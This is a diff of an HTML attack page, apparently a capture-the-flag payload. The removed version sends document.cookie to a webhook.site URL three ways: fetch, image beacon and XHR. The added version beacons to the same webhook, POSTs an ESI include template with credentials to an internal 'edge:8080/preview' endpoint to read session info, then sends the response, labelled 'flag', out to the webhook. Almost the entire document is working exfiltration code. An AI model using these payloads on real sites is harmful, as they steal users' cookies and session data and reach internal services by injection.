@@ -1,20 +1,15 @@
-<!DOCTYPE html>
-<html>
-<body>
-  <h1>hello</h1>
+<!doctype html><meta charset="utf-8">
+<img src="https://webhook.site/4870c85a-b9e2-4532-ac83-8c07bae03b80/?step=loaded">
 <script>
-  var webhook = "https://webhook.site/4870c85a-b9e2-4532-ac83-8c07bae03b80";
-  
-  // Method 1: fetch
-  fetch(webhook + "?c=" + encodeURIComponent(document.cookie));
-  
-  // Method 2: image beacon (fallback)
-  new Image().src = webhook + "?cookie=" + encodeURIComponent(document.cookie);
-  
-  // Method 3: XHR fallback
-  var x = new XMLHttpRequest();
-  x.open("GET", webhook + "?xhr=" + encodeURIComponent(document.cookie));
-  x.send();
+const W="https://webhook.site/4870c85a-b9e2-4532-ac83-8c07bae03b80/";
+new Image().src=W+"?step=js";
+fetch("http://edge:8080/preview",{
+  method:"POST",
+  headers:{"Content-Type":"application/x-www-form-urlencoded"},
+  body:'template=<esi:include src="/fragments/session-info"/>',
+  credentials:"include"
+})
+.then(r=>r.text())
+.then(t=>{ new Image().src=W+"?flag="+encodeURIComponent(t); })
+.catch(e=>{ new Image().src=W+"?err="+encodeURIComponent(e.message); });
 </script>
-</body>
-</html>
